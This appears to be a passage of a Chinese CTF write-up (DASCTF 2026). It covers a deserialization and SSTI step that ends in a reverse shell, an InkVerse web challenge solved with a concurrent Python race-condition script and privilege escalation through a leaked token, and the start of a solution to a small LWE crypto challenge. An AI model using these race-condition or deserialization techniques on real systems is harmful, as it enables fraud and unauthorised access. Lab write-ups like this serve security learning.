+<h4 id="触发反序列化ssti"><a class="markdownIt-Anchor" href="#触发反序列化ssti"></a> 触发反序列化+SSTI</h4>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /api/export/generate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=...</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;refundId&quot;: N, &quot;exportToken&quot;: &quot;&lt;TOKEN&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>返回包通常是 Unexpected object type: com.tax.util.ScheduledTaskHandler. Expected: com.tax.model.TaxReport，这是正常现象——命令已经在 readObject 阶段执行完了，只是后面强转TaxReport 失败而已。</p>
+<p>这里需要反弹shell</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530144446853.png" alt="image-20260530144446853" /></p>
+<p>成功getshell</p>
+<h3 id="inkverse"><a class="markdownIt-Anchor" href="#inkverse"></a> <strong>InkVerse</strong></h3>
+<blockquote>
+<p>InkVerse是一个功能丰富的社区博客平台，支持文章发布、赞赏打赏、内容审核、文章导出以及每周摘要报告等功能。平台最近完成了一次大规模架构升级，引入了后台任务队列和分级公告系统。作为受邀的安全顾问，你的任务是对该系统进行全面评估。试试 /api/docs</p>
+</blockquote>
+<blockquote>
+<p>总结：<br />
+<strong>漏洞点</strong>：</p>
+<ul>
+<li><code>POST /api/tip</code> 存在竞态条件<br />
+余额检查和扣款/加声望不是原子操作，并发后可以“超扣余额”，把普通用户刷成 reviewer。</li>
+<li><code>Feature-Token</code> 泄露在导出文件里<br />
+reviewer 能导出文章，导出内容里直接给了 Feature-Token，于是能合法调用 /api/review/feature。</li>
+</ul>
+<p><strong>逻辑链</strong>：</p>
+<ol>
+<li>先从 /api/docs 拿到完整接口面。</li>
+<li>利用 /api/tip 的竞态把普通用户刷成 reviewer。</li>
+<li>用 reviewer 审核另一个普通用户的文章并导出。</li>
+<li>从导出文件里拿到 Feature-Token。</li>
+<li>用这个 token 把该普通用户的文章设成 featured。</li>
+<li>切回那个作者访问 /bulletin，拿到 featured_authors 级别公告里的 flag。</li>
+</ol>
+</blockquote>
+<h4 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h4>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530150632515.png" alt="image-20260530150632515" /></p>
+<p><code>/api/docs</code>提供了端点</p>
+<p><strong>1. 认证模块 (<code>/auth</code>)</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">端点</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/login</code></td>
+<td style="text-align:left">登录（表单：username, password）</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/register</code></td>
+<td style="text-align:left">注册新账号（表单：username, password）</td>
+</tr>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/logout</code></td>
+<td style="text-align:left">注销当前会话</td>
+</tr>
+</tbody>
+</table>
+<p><strong>2. 博客模块 (<code>/blog</code>)</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">端点</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/</code></td>
+<td style="text-align:left">列出已发布的文章</td>
+</tr>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/article/&lt;id&gt;</code></td>
+<td style="text-align:left">查看文章</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/article/new</code></td>
+<td style="text-align:left">创建新文章（表单：title, content）</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/article/&lt;id&gt;/edit</code></td>
+<td style="text-align:left">编辑草稿或被拒文章</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/article/&lt;id&gt;/submit</code></td>
+<td style="text-align:left">提交文章供审核</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/article/&lt;id&gt;/delete</code></td>
+<td style="text-align:left">删除自己的文章</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/tip</code></td>
+<td style="text-align:left">给文章作者打赏（JSON: article_id）</td>
+</tr>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/dashboard</code></td>
+<td style="text-align:left">用户仪表盘（含统计信息）</td>
+</tr>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/api/user/info</code></td>
+<td style="text-align:left">获取当前用户信息</td>
+</tr>
+</tbody>
+</table>
+<p><strong>3. 审核模块 (<code>/review</code>)</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">端点</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/review</code></td>
+<td style="text-align:left">审核面板（reviewer/admin 可见）</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/review/single</code></td>
+<td style="text-align:left">单篇审核（JSON: article_id, action）</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/review/batch</code></td>
+<td style="text-align:left">批量审核（JSON: article_ids[], action）</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/review/feature</code></td>
+<td style="text-align:left">请求推荐文章（JSON: article_id, signature）</td>
+</tr>
+<tr>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/api/review/feature/status</code></td>
+<td style="text-align:left">查询推荐文章请求状态（query: article_id）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>4. 管理模块 (<code>/admin</code>) – 仅管理员</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">端点</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/admin/promote</code></td>
+<td style="text-align:left">提升用户权限</td>
+</tr>
+<tr>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/articles/import</code></td>
+<td style="text-align:left">导入文章</td>
+</tr>
+</tbody>
+</table>
+<p><strong>5. 其他功能模块</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">模块</th>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">端点</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>公告</strong></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/bulletin</code></td>
+<td style="text-align:left">查看公告板</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/bulletin/refresh</code></td>
+<td style="text-align:left">使缓存的公告数据失效</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>摘要/文摘</strong></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/digests/&lt;filename&gt;</code></td>
+<td style="text-align:left">下载摘要文件</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/digest/subscribe</code></td>
+<td style="text-align:left">订阅摘要（JSON: digest_type, include_private）</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>导出</strong></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/export</code></td>
+<td style="text-align:left">创建导出任务（JSON: article_id）</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/api/export/status</code></td>
+<td style="text-align:left">列出导出任务及其状态</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left"><code>/exports/&lt;filename&gt;</code></td>
+<td style="text-align:left">下载已完成的导出文件</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>邀请</strong></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/invite/create</code></td>
+<td style="text-align:left">创建邀请码（JSON: target_role）</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left"><code>/api/invite/use</code></td>
+<td style="text-align:left">使用邀请码（JSON: code）</td>
+</tr>
+</tbody>
+</table>
+<p>通过<code>/api/tip</code>给文章作者打赏可获取声望值</p>
+<p>初始余额 200，声望 0，角色 user</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530161927935.png" alt="image-20260530161927935" /></p>
+<p>但最多只能升到40，还差10点</p>
+<p>每次打赏：</p>
+<ul>
+<li>余额 -10</li>
+<li>声望 +2</li>
+</ul>
+<p>余额不够之后返回<code> &#123;&quot;error&quot;:&quot;Insufficient balance&quot;&#125;</code></p>
+<h4 id="条件竞争"><a class="markdownIt-Anchor" href="#条件竞争"></a> 条件竞争</h4>
+<p>这里猜测需要进行条件竞争</p>
+<p>在扣款和增加声望之间进行竞争</p>
+<p>新注册用户 B，然后并发请求 /api/tip 多次。</p>
+<p>一个可用的 Python 并发脚本思路：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, concurrent.futures</span><br><span class="line"></span><br><span class="line">base = <span class="string">&quot;http://03997f3a.http-ctf2.dasctf.com&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.post(base + <span class="string">&quot;/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;B&quot;</span>&#125;)</span><br><span class="line">cookies = s.cookies.get_dict()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tip</span>(<span class="params">_</span>):</span><br><span class="line">    ss = requests.Session()</span><br><span class="line">    ss.cookies.update(cookies)</span><br><span class="line">    r = ss.post(base + <span class="string">&quot;/api/tip&quot;</span>, json=&#123;<span class="string">&quot;article_id&quot;</span>: <span class="number">1</span>&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">30</span>) <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ex.<span class="built_in">map</span>(tip, <span class="built_in">range</span>(<span class="number">30</span>)):</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530162510581.png" alt="image-20260530162510581" /></p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530162516299.png" alt="image-20260530162516299" /></p>
+<p>成功到达reviewer权限</p>
+<p>这时用户 B 访问：</p>
+<ul>
+<li>/review</li>
+<li>/bulletin</li>
+<li>/api/export/status</li>
+</ul>
+<p>都能进了</p>
+<h4 id="feature-token泄露"><a class="markdownIt-Anchor" href="#feature-token泄露"></a> Feature-Token泄露</h4>
+<p>看到公告面板：<br />
+<img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530162836838.png" alt="image-20260530162836838" /></p>
+<p>接下来需要一个“作者账号”来拿 featured_authors 公告层。<br />
+用之前的普通用户 A 创建一篇文章：</p>
+<p><code>POST /article/new Content-Type: application/x-www-form-urlencoded title=test123&amp;content=hello</code></p>
+<p>然后提交审核：</p>
+<p><code>POST /article/&lt;id&gt;/submit</code></p>
+<p>切到 reviewer 用户 B，审核通过 A 的文章：</p>
+<p><code>POST /api/review/single Content-Type: application/json &#123;&quot;article_id&quot;:15,&quot;action&quot;:&quot;approve&quot;&#125;</code></p>
+<p>文章发布后，reviewer 可以导出它：</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163218953.png" alt="image-20260530163218953" /></p>
+<p>轮询导出状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/export/status</span><br></pre></td></tr></table></figure>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163246491.png" alt="image-20260530163246491" /></p>
+<p>下载导出文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /exports/export_6_12.txt</span><br></pre></td></tr></table></figure>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163321541.png" alt="image-20260530163321541" /></p>
+<p>这里最重要的是 Feature-Token</p>
+<p>用 reviewer 用户 B 提交 feature 请求</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163449954.png" alt="image-20260530163449954" /></p>
+<p>再轮询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/review/feature/status?article_id=12</span><br></pre></td></tr></table></figure>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163512955.png" alt="image-20260530163512955" /></p>
+<p>现在文章作者 A 已经成了 featured author。切回 A，刷新公告缓存：</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163619147.png" alt="image-20260530163619147" /></p>
+<p>拿到flag</p>
+<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
+<h3 id="lattice_oraclelwe向量暴力枚举aes"><a class="markdownIt-Anchor" href="#lattice_oraclelwe向量暴力枚举aes"></a> <strong>lattice_oracle(LWE向量暴力枚举+AES)</strong></h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, os, json, random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;?&quot;</span>  <span class="comment"># 待加密的flag</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">6</span>  <span class="comment"># 秘密向量s的维度</span></span><br><span class="line">q = <span class="number">97</span>  <span class="comment"># 模数，所有运算在模97下进行</span></span><br><span class="line">m = <span class="number">30</span>  <span class="comment"># 生成的样本数量（方程数量）</span></span><br><span class="line"></span><br><span class="line">s = [random.randint(<span class="number">0</span>, <span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]  <span class="comment"># 生成秘密向量s，每个元素取值0-3，共n=6个</span></span><br><span class="line"></span><br><span class="line">A = []  <span class="comment"># 存储所有样本的系数向量a_i</span></span><br><span class="line">b = []  <span class="comment"># 存储所有样本的结果b_i</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):  <span class="comment"># 循环生成m=30个样本</span></span><br><span class="line">    a_i = [random.randint(<span class="number">0</span>, q - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]  <span class="comment"># 生成随机系数向量a_i，每个元素0-96，每行六个，每列30个</span></span><br><span class="line">    e_i = random.randint(-<span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># 生成小噪声，取值-1,0,1</span></span><br><span class="line">    b_i = (<span class="built_in">sum</span>(x * y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a_i, s)) + e_i) % q  <span class="comment"># 计算b_i = (a_i·s + e_i) mod q</span></span><br><span class="line">    A.append(a_i)  <span class="comment"># 将系数向量a_i添加到列表A中</span></span><br><span class="line">    b.append(b_i)  <span class="comment"># 将计算结果b_i添加到列表b中</span></span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(s).encode()).digest()[:<span class="number">16</span>]  <span class="comment"># 将秘密向量s转为字符串并计算SHA256，取前16字节作为AES密钥</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)  <span class="comment"># 生成16字节的随机初始化向量(IV)</span></span><br><span class="line">pad_len = <span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>  <span class="comment"># 计算PKCS7填充长度，使flag长度成为16的倍数</span></span><br><span class="line"><span class="comment"># 对flag进行填充并加密：flag + 填充字节(每个字节的值等于填充长度)</span></span><br><span class="line">enc = AES.new(key, AES.MODE_CBC, iv).encrypt(flag + <span class="built_in">bytes</span>([pad_len]) * pad_len)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有参数，供解密使用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)  <span class="comment"># 打印维度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)  <span class="comment"># 打印模数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m = <span class="subst">&#123;m&#125;</span>&quot;</span>)  <span class="comment"># 打印样本数量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;A = <span class="subst">&#123;A&#125;</span>&quot;</span>)  <span class="comment"># 打印所有系数向量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)  <span class="comment"># 打印所有b值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;iv = &#x27;<span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&#x27;&quot;</span>)  <span class="comment"># 打印IV的十六进制字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = &#x27;<span class="subst">&#123;enc.<span class="built_in">hex</span>()&#125;</span>&#x27;&quot;</span>)  <span class="comment"># 打印密文的十六进制字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 6</span></span><br><span class="line"><span class="string">q = 97</span></span><br><span class="line"><span class="string">m = 30</span></span><br><span class="line"><span class="string">A = [[94, 13, 86, 94, 69, 11], [54, 4, 3, 11, 27, 29], [77, 3, 71, 25, 91, 83], [69, 53, 28, 57, 75, 35], [20, 89, 54, 43, 35, 19], [43, 13, 11, 48, 12, 45], [77, 33, 5, 93, 58, 68], [48, 10, 70, 37, 80, 79], [73, 24, 90, 8, 5, 84], [37, 10, 29, 12, 48, 35], [81, 46, 20, 47, 45, 26], [34, 89, 87, 82, 9, 77], [21, 68, 93, 31, 20, 59], [34, 81, 88, 71, 28, 87], [77, 29, 4, 40, 51, 34], [27, 72, 91, 40, 27, 83], [50, 82, 58, 18, 33, 17], [95, 71, 68, 33, 95, 74], [74, 51, 46, 28, 17, 65], [11, 96, 6, 14, 19, 80], [87, 54, 76, 8, 49, 48], [59, 67, 32, 70, 1, 87], [14, 87, 68, 96, 34, 82], [14, 37, 55, 20, 58, 0], [92, 33, 64, 22, 64, 13], [38, 81, 64, 77, 25, 19], [20, 69, 67, 0, 76, 41], [2, 14, 46, 39, 30, 7], [72, 10, 10, 93, 62, 8], [16, 16, 84, 60, 70, 21]]</span></span><br><span class="line"><span class="string">b = [56, 74, 51, 28, 10, 30, 34, 45, 82, 56, 62, 52, 5, 71, 35, 41, 86, 47, 8, 27, 64, 29, 57, 92, 34, 55, 57, 70, 87, 28]</span></span><br><span class="line"><span class="string">iv = &#x27;bcdad772f7a0ec967887f7b8f36234c8&#x27;</span></span><br><span class="line"><span class="string">enc = &#x27;00ac1bac207e84d91c6243c4aead3576a20f996a5420eea7bfa0df3b61d68c83f283bd31f1fedf7465b6445d7a58dcdc&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>这题的核心点是根据``A<code>（系数）和 </code>b<code>（结果），反推 </code>s`</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b_i = (a_i · s + e_i) mod <span class="number">97</span></span><br></pre></td></tr></table></figure>
+<p><code>a_i · s</code> 是点积。如果没有噪声 <code>e_i</code>，这就是普通的线性方程组，直接高斯消元就能解。加了噪声 <code>e_i∈ &#123;-1,0,1&#125;</code> 后，理论上变成了「困难问题」——这是后量子密码学的基础。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(s).encode()).digest()[:<span class="number">16</span>]   <span class="comment"># 用 s 的字符串生成 AES 密钥</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key, AES.MODE_CBC, iv).encrypt(flag + padding)  <span class="comment"># AES-CBC 加密 flag</span></span><br></pre></td></tr></table></figure>
+<p>真实世界的 LWE 之所以安全，是因为 <code>s</code> 的维度 <code>n</code> 很大（几百上千）、取值范围很广。但这题里：</p>
+<ul>
+<li><code>n = 6</code> 太小了</li>
+<li><code>s</code> 的每个元素<strong>只在 0~3 之间</strong>，只有 4 种取值</li>
+</ul>
+<p>所以全部可能的 <code>s</code> 只有 <code>4^6 = 4096</code> 种。直接<strong>暴力枚举</strong>每一种 <code>s</code>，代入所有 30 个方程检验：如果对所有 <code>i</code>，<code>(b_i - a_i·s) mod 97</code> 都落在 <code>&#123;-1, 0, 1&#125;</code>（即 mod 97 后是 <code>&#123;0, 1, 96&#125;</code>）里，那这个 <code>s</code> 就是正确的秘密。</p>
+<p>找到 <code>s</code> 后，按和题目一模一样的方式算出 AES 密钥，解密即可。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">n = <span class="number">6</span></span><br><span class="line">q = <span class="number">97</span></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line">A = [[<span class="number">94</span>, <span class="number">13</span>, <span class="number">86</span>, <span class="number">94</span>, <span class="number">69</span>, <span class="number">11</span>], [<span class="number">54</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">29</span>], [<span class="number">77</span>, <span class="number">3</span>, <span class="number">71</span>, <span class="number">25</span>, <span class="number">91</span>, <span class="number">83</span>], [<span class="number">69</span>, <span class="number">53</span>, <span class="number">28</span>, <span class="number">57</span>, <span class="number">75</span>, <span class="number">35</span>], [<span class="number">20</span>, <span class="number">89</span>, <span class="number">54</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">19</span>], [<span class="number">43</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">48</span>, <span class="number">12</span>, <span class="number">45</span>], [<span class="number">77</span>, <span class="number">33</span>, <span class="number">5</span>, <span class="number">93</span>, <span class="number">58</span>, <span class="number">68</span>], [<span class="number">48</span>, <span class="number">10</span>, <span class="number">70</span>, <span class="number">37</span>, <span class="number">80</span>, <span class="number">79</span>], [<span class="number">73</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">84</span>], [<span class="number">37</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">48</span>, <span class="number">35</span>], [<span class="number">81</span>, <span class="number">46</span>, <span class="number">20</span>, <span class="number">47</span>, <span class="number">45</span>, <span class="number">26</span>], [<span class="number">34</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">9</span>, <span class="number">77</span>], [<span class="number">21</span>, <span class="number">68</span>, <span class="number">93</span>, <span class="number">31</span>, <span class="number">20</span>, <span class="number">59</span>], [<span class="number">34</span>, <span class="number">81</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">28</span>, <span class="number">87</span>], [<span class="number">77</span>, <span class="number">29</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">34</span>], [<span class="number">27</span>, <span class="number">72</span>, <span class="number">91</span>, <span class="number">40</span>, <span class="number">27</span>, <span class="number">83</span>], [<span class="number">50</span>, <span class="number">82</span>, <span class="number">58</span>, <span class="number">18</span>, <span class="number">33</span>, <span class="number">17</span>], [<span class="number">95</span>, <span class="number">71</span>, <span class="number">68</span>, <span class="number">33</span>, <span class="number">95</span>, <span class="number">74</span>], [<span class="number">74</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">65</span>], [<span class="number">11</span>, <span class="number">96</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">80</span>], [<span class="number">87</span>, <span class="number">54</span>, <span class="number">76</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">48</span>], [<span class="number">59</span>, <span class="number">67</span>, <span class="number">32</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">87</span>], [<span class="number">14</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">96</span>, <span class="number">34</span>, <span class="number">82</span>], [<span class="number">14</span>, <span class="number">37</span>, <span class="number">55</span>, <span class="number">20</span>, <span class="number">58</span>, <span class="number">0</span>], [<span class="number">92</span>, <span class="number">33</span>, <span class="number">64</span>, <span class="number">22</span>, <span class="number">64</span>, <span class="number">13</span>], [<span class="number">38</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">77</span>, <span class="number">25</span>, <span class="number">19</span>], [<span class="number">20</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">41</span>], [<span class="number">2</span>, <span class="number">14</span>, <span class="number">46</span>, <span class="number">39</span>, <span class="number">30</span>, <span class="number">7</span>], [<span class="number">72</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">93</span>, <span class="number">62</span>, <span class="number">8</span>], [<span class="number">16</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">21</span>]]</span><br><span class="line">b = [<span class="number">56</span>, <span class="number">74</span>, <span class="number">51</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">82</span>, <span class="number">56</span>, <span class="number">62</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">35</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">47</span>, <span class="number">8</span>, <span class="number">27</span>, <span class="number">64</span>, <span class="number">29</span>, <span class="number">57</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">28</span>]</span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(<span 